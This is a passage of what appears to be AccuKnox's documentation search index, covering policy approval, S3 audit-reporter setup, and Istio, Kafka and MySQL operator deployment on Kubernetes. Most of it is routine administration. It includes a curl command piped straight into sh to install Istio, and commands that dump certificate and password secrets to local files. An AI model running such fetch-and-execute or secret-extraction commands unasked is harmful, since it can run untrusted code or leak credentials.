\u201cGo to the Pending Approval\u201d screen and Approve the policy. Note: You need Administrative permission to approve policies. Approved Policy will appear on All Policies Screen.","title":"View and apply Auto-discovered Policies"},{"location":"policy_manager/view_and_apply_auto_discovery_policy/#view-auto-discovered-policies","text":"You can filter Auto Discovered Policies using the following filters: Cluster:- Filter Policies by clusters belonging to your workspace. Namespace: Filter Policies by namespaces belonging to selected clusters Policy-Type: Filter Policies by Policy types. There are 3 Policy types. (i) Network-Ingress (ii) Network-Egress (iii) System Policy Category: Category will give the status of the policies. There are 2 categories. Used: When the Policy is applied from the Auto Discovered Policy Screen, It will go to All Policy Screen and Category will be changed to Used . You can list all used policies with the used category. Ignore: You can list all ignored policies using this filter.","title":"View Auto Discovered Policies."},{"location":"policy_manager/view_and_apply_auto_discovery_policy/#apply-auto-discovered-policies","text":"Select one or more policies from the list Note: The default screen will show all unused policies. Click the \u201cAction\u201d button on the top right corner. There are 3 Actions that can be performed. (i) Apply (ii) Ignore (iii) Deselect all Click Apply . Then Policy will be applied to the cluster. Applied Policy will go to pending approval. Click on the \u201cGo to the Pending Approval\u201d screen and Approve the policy. Note: You need Administrative permission to approve policies. Approved Policy will appear on All Policies Screen.","title":"Apply Auto Discovered Policies."},{"location":"policy_manager/view_and_apply_recommended_policy/","text":"Accuknox provides a number of out-of-the-box recommended policies based on popular workloads or for the host. These policies are recommended to you only after analyzing your workloads and hosts. These policies will cover known CVEs and attack vectors, compliance frameworks (such as MITRE, PCI-DSS, STIG, etc.) and many more. Viewing Recommended Policy: \u00b6 Select Policy Manager -> Recommended Policies . This section is used to help to protect your workloads by recommending security policies to your workloads. Available DSL Filters Cluster Namespace Workload Policy Type Status Cluster This will show a list of onboard clusters. In SideBar you can see Workspace Manager click that section there will be 4 subsections. Click that 3th subSection onboard cluster (Workspace Manager \u2192 Onboard Cluster ) now you can onboard cluster. Currently, we are supporting only Google Cloud Platform(GCP) right now and in the future, we will support other cloud platforms too. Namespace This will show a list of Namespaces of an onboard cluster. Namespace filter is mainly used for you can apply Recommended Policy to specify the namespace in the cluster and you can clearly see list namespace in the onboard cluster. Workload A workload is an application running on Kubernetes. Here workload type is used to filter the workloads which are onboard. It is in the form of a checklist and it has a list of workload in the system. Policy Type It is in the form of a drop-down box. The 4 options are listed below Select All: This should select all the policies of the host and network. Select All \u2192 policy can apply the policy you can either via workload or Pod. Network-Ingress: The Network Policies are created in cilium CNI this Network-Ingress will show how you can control the outgoing connection to incoming connection to the pod or workload. Network-Egress: The network policies are created in cilium CNI this network-Egress will show how you can control the incoming to outgoing connections. System-Policy: The System-policy is created in Kubearmor and it will help to audit the process, file, network. Status: This is in the form of a checklist. It has three checklists: Select All, Recommended, Ignored, Applied. Select ALL: this will show both the Recommended Policy and Ignored Policy Recommended Policy: This will show only recommended Policy related to your Workload. Ignored Policy: This will show only which you ignored related to your workload. Applied Policy: This will show only applied policy related to your workload. Above DSL filter can be used as Permutation and combinations. All the DSL filters can apply at the same time to find out whether Pod or Workload recommended policies are applied or not. Below the DSL button filter, you can see filters by properties. Here also you can use permutation and combination methods to find the specified Pod or workload. Properties: Policy Group Policy Entity Cluster The above properties are in the form key-value pair. Here the key is Policy group, policy, Entity, Cluster and values which you are onboard cluster. Applying Recommended Policy: \u00b6 On the Recommended Policies list page, You can see all the recommended policies based on your workloads and hosts. Select one or more policies, then click Apply On the Apply page, selector labels will be preselected associated with your workloads. You can review labels and if you want to change the labels you can also do it. Selector labels will decide where selected policies are going to apply. After Apply; Select Policy Manager -> Pending Approval -> Approve","title":"View and apply Recommended Polices"},{"location":"policy_manager/view_and_apply_recommended_policy/#viewing-recommended-policy","text":"Select Policy Manager -> Recommended Policies . This section is used to help to protect your workloads by recommending security policies to your workloads. Available DSL Filters Cluster Namespace Workload Policy Type Status Cluster This will show a list of onboard clusters. In SideBar you can see Workspace Manager click that section there will be 4 subsections. Click that 3th subSection onboard cluster (Workspace Manager \u2192 Onboard Cluster ) now you can onboard cluster. Currently, we are supporting only Google Cloud Platform(GCP) right now and in the future, we will support other cloud platforms too. Namespace This will show a list of Namespaces of an onboard cluster. Namespace filter is mainly used for you can apply Recommended Policy to specify the namespace in the cluster and you can clearly see list namespace in the onboard cluster. Workload A workload is an application running on Kubernetes. Here workload type is used to filter the workloads which are onboard. It is in the form of a checklist and it has a list of workload in the system. Policy Type It is in the form of a drop-down box. The 4 options are listed below Select All: This should select all the policies of the host and network. Select All \u2192 policy can apply the policy you can either via workload or Pod. Network-Ingress: The Network Policies are created in cilium CNI this Network-Ingress will show how you can control the outgoing connection to incoming connection to the pod or workload. Network-Egress: The network policies are created in cilium CNI this network-Egress will show how you can control the incoming to outgoing connections. System-Policy: The System-policy is created in Kubearmor and it will help to audit the process, file, network. Status: This is in the form of a checklist. It has three checklists: Select All, Recommended, Ignored, Applied. Select ALL: this will show both the Recommended Policy and Ignored Policy Recommended Policy: This will show only recommended Policy related to your Workload. Ignored Policy: This will show only which you ignored related to your workload. Applied Policy: This will show only applied policy related to your workload. Above DSL filter can be used as Permutation and combinations. All the DSL filters can apply at the same time to find out whether Pod or Workload recommended policies are applied or not. Below the DSL button filter, you can see filters by properties. Here also you can use permutation and combination methods to find the specified Pod or workload. Properties: Policy Group Policy Entity Cluster The above properties are in the form key-value pair. Here the key is Policy group, policy, Entity, Cluster and values which you are onboard cluster.","title":"Viewing Recommended Policy:"},{"location":"policy_manager/view_and_apply_recommended_policy/#applying-recommended-policy","text":"On the Recommended Policies list page, You can see all the recommended policies based on your workloads and hosts. Select one or more policies, then click Apply On the Apply page, selector labels will be preselected associated with your workloads. You can review labels and if you want to change the labels you can also do it. Selector labels will decide where selected policies are going to apply. After Apply; Select Policy Manager -> Pending Approval -> Approve","title":"Applying Recommended Policy:"},{"location":"s3-data-protection/Pre-requisites-S3-Audit-Reporter/","text":"The following article provides the pre-requisites and instructions to install AccuKnox S3 Audit Reporter agent to monitor access logs of S3 buckets and export relevent metrics to AccuKnox Control Plane. Requirements \u00b6 The following software and network requirements must be met. AWS S3 Requirements \u00b6 For any AWS S3 bucket that needs to be monitored, we need the following requirements to be met with: Enable the AWS S3 Access Logs - https://docs.aws.amazon.com/AmazonS3/latest/userguide/enable-server-access-logging.html Create AWS user credentials(access key id and secret access key) for the Data Bucket - the bucket that contains the objects to be monitored. This user credentials must have permission to list the objects in the data bucket. Create AWS user credentials(access key id and secret access key) for the Logs Bucket - the bucket that contains the logs objects. This user credentials must have permissions to list the objects and retreive the objects present in the logs bucket. Software Requirements \u00b6 AccuKnox S3 Audit Reporter supports Linux and can be run on most major Linux based OSes such as Ubuntu 18.04+, Debian 8+, CentOS 7+. Network Requirements \u00b6 AccuKnox S3 Audit Reporter requires port number 443 to be open for egress. This port will be used to fetch S3 Access Log data, Bucket data and to push metrics to AccuKnox Control Plane. AWS S3 Bucket configuration \u00b6 AccuKnox S3 Audit Reporter can monitor more than 1 bucket at a time. The bucket to be monitored is configured through a file located at conf/buckets.yaml The following is an example of a buckets.yaml: apiVersion: v1 type: S3AuditReporterBuckets data: workspace: 30921123 apiToken: as013n21m3nkjn2m1m97sd buckets: - dataBucketName: bucket-1 logsBucketName: bucket-1-logs logPrefix: logs/ dataBucketAccessKeyId: AK..... dataBucketSecretAccessKey: 99..... logBucketAccessKeyId: AK... logBucketSecretAccessKey: 99.... dataSourceProvider: AWS bucketRegion: us-west-2 - dataBucketName: bucket-2 logsBucketName: bucket-2-logs logPrefix: dataBucketAccessKeyId: AK..... dataBucketSecretAccessKey: 99..... logBucketAccessKeyId: AK... logBucketSecretAccessKey: 99.... dataSourceProvider: AWS bucketRegion: us-west-2 Root section \u00b6 Key description default required apiVersion Version of the S3 Audit Reporter API None yes type S3AuditReporterBuckets S3AuditReporterBuckets yes data Data section None yes ### Data section Key description default required :----- :----- :------ :------ workspace Your workspace None yes apiToken API Token to use with Accuknox Control Plane None yes buckets List of buckets to monitor None yes ### Buckets section Key description default required :----- :----- :------ :------ dataBucketName Name of the bucket that holds the data objects None yes logsBucketName Name of the bucket that holds the log objects None yes logPrefix The path where the log files are stored in the logs bucket. (empty) yes dataBucketAccessKeyid Access key ID for the Data Bucket None yes dataBucketSecretAccessKey Secret Access Key for the Data Bucket None yes logBucketAccessKeyId Access Key ID for the Logs bucket None yes log BucketSecretAccessKey Secret Access Key for the Logs bucket None yes dataSourceProvider Cloud Provider - AWS, GCP, AZURE None yes bucketRegion Region where the bucket is configured at None yes Installation \u00b6 Unzip AccuKnox S3 Audit Reporter unzip aks3r.zip -d aks3r Edit the conf/buckets.yaml Configure the buckets to be monitored Add the workspace Add the apiToken The app.yaml and buckets.yaml files must be present inside conf/ folder. Run AccuKnox S3 Audit Reporter ./asar > /dev/null 2>&1 &","title":"Pre requisites S3 Audit Reporter"},{"location":"s3-data-protection/Pre-requisites-S3-Audit-Reporter/#requirements","text":"The following software and network requirements must be met.","title":"Requirements"},{"location":"s3-data-protection/Pre-requisites-S3-Audit-Reporter/#aws-s3-requirements","text":"For any AWS S3 bucket that needs to be monitored, we need the following requirements to be met with: Enable the AWS S3 Access Logs - https://docs.aws.amazon.com/AmazonS3/latest/userguide/enable-server-access-logging.html Create AWS user credentials(access key id and secret access key) for the Data Bucket - the bucket that contains the objects to be monitored. This user credentials must have permission to list the objects in the data bucket. Create AWS user credentials(access key id and secret access key) for the Logs Bucket - the bucket that contains the logs objects. This user credentials must have permissions to list the objects and retreive the objects present in the logs bucket.","title":"AWS S3 Requirements"},{"location":"s3-data-protection/Pre-requisites-S3-Audit-Reporter/#software-requirements","text":"AccuKnox S3 Audit Reporter supports Linux and can be run on most major Linux based OSes such as Ubuntu 18.04+, Debian 8+, CentOS 7+.","title":"Software Requirements"},{"location":"s3-data-protection/Pre-requisites-S3-Audit-Reporter/#network-requirements","text":"AccuKnox S3 Audit Reporter requires port number 443 to be open for egress. This port will be used to fetch S3 Access Log data, Bucket data and to push metrics to AccuKnox Control Plane.","title":"Network Requirements"},{"location":"s3-data-protection/Pre-requisites-S3-Audit-Reporter/#aws-s3-bucket-configuration","text":"AccuKnox S3 Audit Reporter can monitor more than 1 bucket at a time. The bucket to be monitored is configured through a file located at conf/buckets.yaml The following is an example of a buckets.yaml: apiVersion: v1 type: S3AuditReporterBuckets data: workspace: 30921123 apiToken: as013n21m3nkjn2m1m97sd buckets: - dataBucketName: bucket-1 logsBucketName: bucket-1-logs logPrefix: logs/ dataBucketAccessKeyId: AK..... dataBucketSecretAccessKey: 99..... logBucketAccessKeyId: AK... logBucketSecretAccessKey: 99.... dataSourceProvider: AWS bucketRegion: us-west-2 - dataBucketName: bucket-2 logsBucketName: bucket-2-logs logPrefix: dataBucketAccessKeyId: AK..... dataBucketSecretAccessKey: 99..... logBucketAccessKeyId: AK... logBucketSecretAccessKey: 99.... dataSourceProvider: AWS bucketRegion: us-west-2","title":"AWS S3 Bucket configuration"},{"location":"s3-data-protection/Pre-requisites-S3-Audit-Reporter/#root-section","text":"Key description default required apiVersion Version of the S3 Audit Reporter API None yes type S3AuditReporterBuckets S3AuditReporterBuckets yes data Data section None yes ### Data section Key description default required :----- :----- :------ :------ workspace Your workspace None yes apiToken API Token to use with Accuknox Control Plane None yes buckets List of buckets to monitor None yes ### Buckets section Key description default required :----- :----- :------ :------ dataBucketName Name of the bucket that holds the data objects None yes logsBucketName Name of the bucket that holds the log objects None yes logPrefix The path where the log files are stored in the logs bucket. (empty) yes dataBucketAccessKeyid Access key ID for the Data Bucket None yes dataBucketSecretAccessKey Secret Access Key for the Data Bucket None yes logBucketAccessKeyId Access Key ID for the Logs bucket None yes log BucketSecretAccessKey Secret Access Key for the Logs bucket None yes dataSourceProvider Cloud Provider - AWS, GCP, AZURE None yes bucketRegion Region where the bucket is configured at None yes","title":"Root section"},{"location":"s3-data-protection/Pre-requisites-S3-Audit-Reporter/#installation","text":"Unzip AccuKnox S3 Audit Reporter unzip aks3r.zip -d aks3r Edit the conf/buckets.yaml Configure the buckets to be monitored Add the workspace Add the apiToken The app.yaml and buckets.yaml files must be present inside conf/ folder. Run AccuKnox S3 Audit Reporter ./asar > /dev/null 2>&1 &","title":"Installation"},{"location":"s3-data-protection/istio-depolyment/","text":"Istio Deployment \u00b6 What is Istio? \u00b6 Istio is an open source service mesh that layers transparently onto existing distributed applications. Istio\u2019s powerful features provide a uniform and more efficient way to secure, connect, and monitor services. Istio is the path to load balancing, service-to-service authentication, and monitoring \u2013 with few or no service code changes. Its powerful control plane brings vital features, including: * Secure service-to-service communication in a cluster with TLS encryption, strong identity based authentication and authorization Automatic load balancing for HTTP, gRPC, WebSocket, and TCP traffic \uf0b7 Fine-grained control of traffic behavior with rich routing rules, retries, failovers, and fault injection A pluggable policy layer and configuration API supporting access controls, rate limits and quotas Automatic metrics, logs, and traces for all traffic within a cluster, including cluster ingress and egress Installation Steps \u00b6 Go to the Istio release page to download the installation file for your OS, or download and extract the latest release automatically (Linux or macOS): curl -L https://istio.io/downloadIstio | ISTIO_VERSION=1.10.0 TARGET_ARCH=x86_64 sh - Move to the Istio package directory. For example, if the package is istio-1.11.3: cd istio-1.10.0 Create a namespace istio-system for Istio components: kubectl create namespace istio-system Install the Istio base chart which contains cluster-wide resources used by the Istio control plane: helm install istio-base manifests/charts/base -n istio-system Install the Istio discovery chart which deploys the istiod control plane service: helm install istiod manifests/charts/istio-control/istio-discovery \\ -n istio-system Install the Istio ingress gateway chart which contains the ingress gateway components: helm install istio-ingress manifests/charts/gateways/istio-ingress \\ -n istio-system Verifying the installation \u00b6 Ensure all Kubernetes pods in istio-system namespace are deployed and have a STATUS of Running: kubectl get pods -n istio-system Installing the Gateway \u00b6 Along with creating a service mesh, Istio allows you to manage gateways, which are Envoy proxies running at the edge of the mesh, providing fine-grained control over traffic entering and leaving the mesh. Unzip and Change Directory \u00b6 unzip platform-istio-gateway-dev cd platform-istio-gateway-dev #Cert Manager Install cert-manager. Cert-manager will manage the certificates of gateway domains. #Setup permissions When running on GKE (Google Kubernetes Engine), you might encounter a \u2018permission denied\u2019 error when creating some of the required resources: kubectl create clusterrolebinding cluster-admin-binding \\ --clusterrole=cluster-admin \\ --user=$(gcloud config get-value core/account) #Install Cert-manager kubectl apply -f https://github.com/jetstack/cert-manager/releases/download/v1.3.1/cert-manager.yaml #platform-istio-gateway Istio Gateway configurations for DNS This gateway config file defines the base API endpoints of the micro services under DNS This repository also contains necessary files to setup SSL for DNS (Refer issuer.yaml and cert.yaml) using cert-manager Create Gateway \u00b6 #Find the Gateway IP INGRESS_HOST=$(kubectl -n istio-system get service istio-ingressgateway -o jsonpath='{.status.loadBalancer.ingress[0].ip) This will give you a LoadBalancer IP: echo ${INGRESS_HOST} #Create DNS Create a record (for eg) ( sample.example.com and keycloak.example.com ) using LoadBalancer IP #Create a certificate \u00b6 Issuers, and ClusterIssuers, are Kubernetes resources that represent certificate authorities (CAs) that are able to generate signed certificates by honoring certificate signing requests. kubectl apply -f issuer.yaml kubectl get ClusterIssuer -n cert-manager# Should have Status as Ready A Certificate is a namespaced resource that references an Issuer or ClusterIssuer that determine what will be honoring the certificate request. kubectl apply -f cert.yaml kubectl get Certificate -n istio-system # Should have Status as Ready #Create gateway with SSL \u00b6 kubectl apply -f gateway-with-ssl.yaml` [No need to specify namespace] #Apply Virtual Service \u00b6 A VirtualService defines a set of traffic routing rules to apply when a host is addressed. Each routing rule defines matching criteria for traffic of a specific protocol. If the traffic is matched, then it is sent to a named destination service (or subset/version of it) defined in the registry. kubectl apply -f backend-api/virtual-service.yaml # [No need to specify namespace] kubectl apply -f keycloak/virtual-service.yaml # [No need to specify namespace]","title":"Istio Deployment"},{"location":"s3-data-protection/istio-depolyment/#istio-deployment","text":"","title":"Istio Deployment"},{"location":"s3-data-protection/istio-depolyment/#what-is-istio","text":"Istio is an open source service mesh that layers transparently onto existing distributed applications. Istio\u2019s powerful features provide a uniform and more efficient way to secure, connect, and monitor services. Istio is the path to load balancing, service-to-service authentication, and monitoring \u2013 with few or no service code changes. Its powerful control plane brings vital features, including: * Secure service-to-service communication in a cluster with TLS encryption, strong identity based authentication and authorization Automatic load balancing for HTTP, gRPC, WebSocket, and TCP traffic \uf0b7 Fine-grained control of traffic behavior with rich routing rules, retries, failovers, and fault injection A pluggable policy layer and configuration API supporting access controls, rate limits and quotas Automatic metrics, logs, and traces for all traffic within a cluster, including cluster ingress and egress","title":"What is Istio?"},{"location":"s3-data-protection/istio-depolyment/#installation-steps","text":"Go to the Istio release page to download the installation file for your OS, or download and extract the latest release automatically (Linux or macOS): curl -L https://istio.io/downloadIstio | ISTIO_VERSION=1.10.0 TARGET_ARCH=x86_64 sh - Move to the Istio package directory. For example, if the package is istio-1.11.3: cd istio-1.10.0 Create a namespace istio-system for Istio components: kubectl create namespace istio-system Install the Istio base chart which contains cluster-wide resources used by the Istio control plane: helm install istio-base manifests/charts/base -n istio-system Install the Istio discovery chart which deploys the istiod control plane service: helm install istiod manifests/charts/istio-control/istio-discovery \\ -n istio-system Install the Istio ingress gateway chart which contains the ingress gateway components: helm install istio-ingress manifests/charts/gateways/istio-ingress \\ -n istio-system","title":"Installation Steps"},{"location":"s3-data-protection/istio-depolyment/#verifying-the-installation","text":"Ensure all Kubernetes pods in istio-system namespace are deployed and have a STATUS of Running: kubectl get pods -n istio-system","title":"Verifying the installation"},{"location":"s3-data-protection/istio-depolyment/#installing-the-gateway","text":"Along with creating a service mesh, Istio allows you to manage gateways, which are Envoy proxies running at the edge of the mesh, providing fine-grained control over traffic entering and leaving the mesh.","title":"Installing the Gateway"},{"location":"s3-data-protection/istio-depolyment/#unzip-and-change-directory","text":"unzip platform-istio-gateway-dev cd platform-istio-gateway-dev #Cert Manager Install cert-manager. Cert-manager will manage the certificates of gateway domains. #Setup permissions When running on GKE (Google Kubernetes Engine), you might encounter a \u2018permission denied\u2019 error when creating some of the required resources: kubectl create clusterrolebinding cluster-admin-binding \\ --clusterrole=cluster-admin \\ --user=$(gcloud config get-value core/account) #Install Cert-manager kubectl apply -f https://github.com/jetstack/cert-manager/releases/download/v1.3.1/cert-manager.yaml #platform-istio-gateway Istio Gateway configurations for DNS This gateway config file defines the base API endpoints of the micro services under DNS This repository also contains necessary files to setup SSL for DNS (Refer issuer.yaml and cert.yaml) using cert-manager","title":"Unzip and Change Directory"},{"location":"s3-data-protection/istio-depolyment/#create-gateway","text":"#Find the Gateway IP INGRESS_HOST=$(kubectl -n istio-system get service istio-ingressgateway -o jsonpath='{.status.loadBalancer.ingress[0].ip) This will give you a LoadBalancer IP: echo ${INGRESS_HOST} #Create DNS Create a record (for eg) ( sample.example.com and keycloak.example.com ) using LoadBalancer IP","title":"Create Gateway"},{"location":"s3-data-protection/istio-depolyment/#create-a-certificate","text":"Issuers, and ClusterIssuers, are Kubernetes resources that represent certificate authorities (CAs) that are able to generate signed certificates by honoring certificate signing requests. kubectl apply -f issuer.yaml kubectl get ClusterIssuer -n cert-manager# Should have Status as Ready A Certificate is a namespaced resource that references an Issuer or ClusterIssuer that determine what will be honoring the certificate request. kubectl apply -f cert.yaml kubectl get Certificate -n istio-system # Should have Status as Ready","title":"#Create a certificate"},{"location":"s3-data-protection/istio-depolyment/#create-gateway-with-ssl","text":"kubectl apply -f gateway-with-ssl.yaml` [No need to specify namespace]","title":"#Create gateway with SSL"},{"location":"s3-data-protection/istio-depolyment/#apply-virtual-service","text":"A VirtualService defines a set of traffic routing rules to apply when a host is addressed. Each routing rule defines matching criteria for traffic of a specific protocol. If the traffic is matched, then it is sent to a named destination service (or subset/version of it) defined in the registry. kubectl apply -f backend-api/virtual-service.yaml # [No need to specify namespace] kubectl apply -f keycloak/virtual-service.yaml # [No need to specify namespace]","title":"#Apply Virtual Service"},{"location":"s3-data-protection/kafka-operator-deployment/","text":"Kafka Operator Deployment \u00b6 Note 1. Do not change the namespace name. If changes to the namespace are made, the you will need to change the service name & If the service name is changed, you will to need to change the microservice configmap files. (eg) app.yaml. 2. Please create a node pool on EKS / GKE / AKS (or) on-premises worker nodes with below Taints and Labels: Taints - kafka:true Labels - kafka:true Steps \u00b6 Untar the Kafka deployment files untar saas-kafka-s3-data-protection.tar.xz Create Namespace kubectl create namespace accuknox-dev-kafka Set Context kubectl config set-context --current --namespace=accuknox-dev-kafka Install the Helm pkg helm install dev-kafka saas-kafka Check the Pods deployment kubectl get pods -n accuknox-dev-kafka Extract the connectivity information ## Get bootstrap server endpoint kubectl get kafka dev-kafka -o jsonpath='{.status.listeners[?(@.type==\"external\")].bootstrapServers}' -n accuknox-dev-kafka ## Get CA kubectl get secret dev-kafka-cluster-ca-cert -o jsonpath='{.data.ca\\.p12}' -n accuknox-dev-kafka | base64 -d > ca.p12 ## Get CA Password kubectl get secret dev-kafka-cluster-ca-cert -o jsonpath='{.data.ca\\.password}' -n accuknox-dev-kafka | base64 -d > ca.password ## Get User Cert kubectl get secret/node-event-feeder-common -n accuknox-dev-kafka -o jsonpath='{.data.user\\.p12}' | base64 -d > user.p12 ## Get user password kubectl get secret/node-event-feeder-common -n accuknox-dev-kafka -o jsonpath='{.data.user\\.password}' | base64 -d > user.password ## Convert user.p12 into base64 cat user.p12 | base64 > user.p12.base64 ## Convert ca.p12 into base64 cat ca.p12 | base64 > ca.p12.base64 ## Convert ca.password into base64 cat ca.password | base64 > ca.password.base64 ## Convert user.password into base64 cat user.password | base64 > user.password.base64 ## Convert p12 to pem openssl pkcs12 -in ca.p12 -out ca.pem ## Convert ca.pem to base64 cat ca.pem | base64 > ca.pem.base64 Note \u00b6 ca.p12, ca.password, user.p12 and user.password are required to be used in Java based applications. For Go based applications, use ca.pem, user.p12 and user.password. In Kubernetes, use the base64 versions of respective files. Set FQDN (Kubernetes\u2019s Service name) Value for Internal Cluster application \u00b6 connectivity FQDN : dev-kafka-kafka-bootstrap.accuknox-dev-kafka.svc.cluster.local:9092","title":"Kafka Operator Deployment"},{"location":"s3-data-protection/kafka-operator-deployment/#kafka-operator-deployment","text":"Note 1. Do not change the namespace name. If changes to the namespace are made, the you will need to change the service name & If the service name is changed, you will to need to change the microservice configmap files. (eg) app.yaml. 2. Please create a node pool on EKS / GKE / AKS (or) on-premises worker nodes with below Taints and Labels: Taints - kafka:true Labels - kafka:true","title":"Kafka Operator Deployment"},{"location":"s3-data-protection/kafka-operator-deployment/#steps","text":"Untar the Kafka deployment files untar saas-kafka-s3-data-protection.tar.xz Create Namespace kubectl create namespace accuknox-dev-kafka Set Context kubectl config set-context --current --namespace=accuknox-dev-kafka Install the Helm pkg helm install dev-kafka saas-kafka Check the Pods deployment kubectl get pods -n accuknox-dev-kafka Extract the connectivity information ## Get bootstrap server endpoint kubectl get kafka dev-kafka -o jsonpath='{.status.listeners[?(@.type==\"external\")].bootstrapServers}' -n accuknox-dev-kafka ## Get CA kubectl get secret dev-kafka-cluster-ca-cert -o jsonpath='{.data.ca\\.p12}' -n accuknox-dev-kafka | base64 -d > ca.p12 ## Get CA Password kubectl get secret dev-kafka-cluster-ca-cert -o jsonpath='{.data.ca\\.password}' -n accuknox-dev-kafka | base64 -d > ca.password ## Get User Cert kubectl get secret/node-event-feeder-common -n accuknox-dev-kafka -o jsonpath='{.data.user\\.p12}' | base64 -d > user.p12 ## Get user password kubectl get secret/node-event-feeder-common -n accuknox-dev-kafka -o jsonpath='{.data.user\\.password}' | base64 -d > user.password ## Convert user.p12 into base64 cat user.p12 | base64 > user.p12.base64 ## Convert ca.p12 into base64 cat ca.p12 | base64 > ca.p12.base64 ## Convert ca.password into base64 cat ca.password | base64 > ca.password.base64 ## Convert user.password into base64 cat user.password | base64 > user.password.base64 ## Convert p12 to pem openssl pkcs12 -in ca.p12 -out ca.pem ## Convert ca.pem to base64 cat ca.pem | base64 > ca.pem.base64","title":"Steps"},{"location":"s3-data-protection/kafka-operator-deployment/#note","text":"ca.p12, ca.password, user.p12 and user.password are required to be used in Java based applications. For Go based applications, use ca.pem, user.p12 and user.password. In Kubernetes, use the base64 versions of respective files.","title":"Note"},{"location":"s3-data-protection/kafka-operator-deployment/#set-fqdn-kubernetess-service-name-value-for-internal-cluster-application","text":"connectivity FQDN : dev-kafka-kafka-bootstrap.accuknox-dev-kafka.svc.cluster.local:9092","title":"Set FQDN (Kubernetes\u2019s Service name) Value for Internal Cluster application"},{"location":"s3-data-protection/mysql-operator-deployment/","text":"MySQL Operator Deployment \u00b6 Note 1. Do not change the namespace name. If changes to the namespace are made, the you will need to change the service name & If the service name is changed, you will to need to change the microservice configmap files. (eg) app.yaml. 2. Please create a node pool on EKS / GKE / AKS (or) on-premises worker nodes with below Taints and Labels : Taints - mysql:true Labels - mysql:true Steps \u00b6 Untar MySql deployment files untar accuknox-dev-mysql.tar.xz Create Namespace kubectl create namespace accuknox-dev-mysql Set Context kubectl config set-context $(kubectl config current-context) --namespace=accuknox-dev-mysql Change Directory cd accuknox-dev-mysql Apply the yaml files - in the order below kubectl apply -f bundle.yaml kubectl apply -f cr.yaml kubectl apply -f secrets.yaml kubectl apply -f ssl-secrets.yaml kubectl apply -f backup-s3.yaml Run a sanitary test with below commands at the mysql namespace kubectl run -i --rm --tty percona-client --image=percona:8.0 --restart=Never -- bash -il Login to MySql mysql -h accuknox-dev-mysql-haproxy -uroot -proot_password After successfully logging in, run any sanitary mysql query and validate it. Update the passwords in secret.yaml file and run below command kubectl apply -f secrets.yaml Set FQDN (Kubernetes\u2019s Service name) Value for Internal Cluster application connectivity FQDN: accuknox-dev-mysql-haproxy.accuknox-dev-mysql.svc.cluster.local Optional \u00b6 To configure backup with GCS, add the HMAC keys in backup-s3.yaml , change the bucket name in cr.yaml and cron can be changed as required cr.yaml files.","title":"MySQL Operator Deployment"},{"location":"s3-data-protection/mysql-operator-deployment/#mysql-operator-deployment","text":"Note 1. Do not change the namespace name. If changes to the namespace are made, the you will need to change the service name & If the service name is changed, you will to need to change the microservice configmap files. (eg) app.yaml. 2. Please create a node pool on EKS / GKE / AKS (or) on-premises worker nodes with below Taints and Labels : Taints - mysql:true Labels - mysql:true","title":"MySQL Operator Deployment"},{"location":"s3-data-protection/mysql-operator-deployment/#steps","text":"Untar MySql deployment files untar accuknox-dev-mysql.tar.xz Create Namespace kubectl create namespace accuknox-dev-mysql Set Context kubectl config set-context $(kubectl config current-context) --namespace=accuknox-dev-mysql Change Directory cd accuknox-dev-mysql Apply the yaml files - in the order below kubectl apply -f bundle.yaml kubectl apply -f cr.yaml kubectl apply -f secrets.yaml kubectl apply -f ssl-secrets.yaml kubectl apply -f backup-s3.yaml Run a sanitary test with below commands at the mysql namespace kubectl run -i --rm --tty percona-client --image=percona:8.0 --restart=Never -- bash -il Login to MySql mysql -h accuknox-dev-mysql-haproxy -uroot -proot_password After successfully logging in, run any sanitary mysql query and validate it. Update the passwords in secret.yaml file and run below command kubectl apply -f secrets.yaml Set FQDN (Kubernetes\u2019s Service name) Value for Internal Cluster application connectivity FQDN: accuknox-dev-mysql-haproxy.accuknox-dev-mysql.svc.cluster.local","title":"Steps"},{"location":"s3-data-protection/mysql-operator-deployment/#optional","text":"To configure backup with GCS, add the HMAC keys in backup-s3.yaml , change the bucket name in cr.yaml and cron can be changed as required cr.yaml files.","title":"Optional"},{"location":"s3-data-protection/overview/","text":"S3 Data Protection - Installation & Deployment Steps for Various Modules \u00b6 Installation Flow \u00b6 1. Backend Platform \u00b6 Kubernetes cluster Installing the backend software components in the kubernetes cluster Setup Databases - MySQL, Pinot Setup Kafka Install Istio in Kubernetes Microservices Setup Istio API Gateway (Internal) 2. UI - Frontend \u00b6 Setup a VM with Nginx as webserver and point to the HTML UI build 3. S3 Data Audit POC \u00b6 Setup 5 S3 buckets (5 for Data Bucket, atleast 1 bucket for logs). Populate some files using the provided script. Setup the S3 Audit Log Reporter Agent in a VM. Configure the data buckets and logs buckets in YAML file. Note: Please install the pre-requisites below before proceeding with deploying the modules: MySql Operator Kafka Operator Pinot Deployment Steps Istio & it's gateway installation Architecture Diagram \u00b6 Data Protection \u00b6 1. Data-protection-management \u00b6 Download tgz file of data-protection-management data-protection-mgmt.tar.gz Create namespace for data-protection-management kubectl create namespace accuknox-dev-data-protection-mgmt Install using Helm helm upgrade --install data-protection- mgmt data-protection-mgmt.tar.gz \u2013n accuknox-dev-data-protection-mgmt Verify the installation of data-protection-management kubectl get pods -n accuknox-dev-data-protection-mgmt 2. s3-audit-reporter-consumer \u00b6 Download tgz file of s3-audit-reporter-consumer s3-audit-reporter-consumer-charts.tar.gz Create namespace for s3-audit-reporter-consumer kubectl create namespace accuknox-dev- s3-audit-reporter-consumer Install using helm helm upgrade --install s3-audit-reporter-consumer s3-audit-reporter- consumer-charts.tar.gz \u2013n accuknox-dev- s3-audit-reporter-consumer Verify the installation of s3-audit-reporter-consumer kubectl get pods -n accuknox-dev- s3-audit-reporter-consumer 3. agent-data-collector \u00b6 Download tgz file of agent-data-collector agent-data-collector-charts.tar.gz Create namespace for agent-data-collector kubectl create namespace accuknox-dev- agent-data-collector Install using helm helm upgrade --install agent-data-collector agent-data-collector- charts.tar.gz \u2013n accuknox-dev- agent-data-collector Verify the installation of agent-data-collector kubectl get pods -n accuknox-dev- agent-data-collector 4. s3-audit-reporter \u00b6 Download tgz file of s3-audit-reporter s3-audit-reporter-charts.tar.gz Untar the file tar -xvf s3-audit-reporter.tar.gz Move to the directory of s3-audit-reporter cd s3-audit-reporter Create namespace for s3-audit-reporter kubectl create namespace [ namespace ] Install Configmap using kubectl, please update with your bucket details kubectl apply \u2013f dev-config.yaml \u2013n [ namespace ] Install Secrets using kubectl kubectl apply \u2013f dev-image-secrets.yaml\u2013n [ namespace ] kubectl apply \u2013f dev-deployment.yaml\u2013n [ namespace ] Verify the installation of s3-audit-reporter kubectl get pods -n [ namespace ] Data Pipeline \u00b6 1. 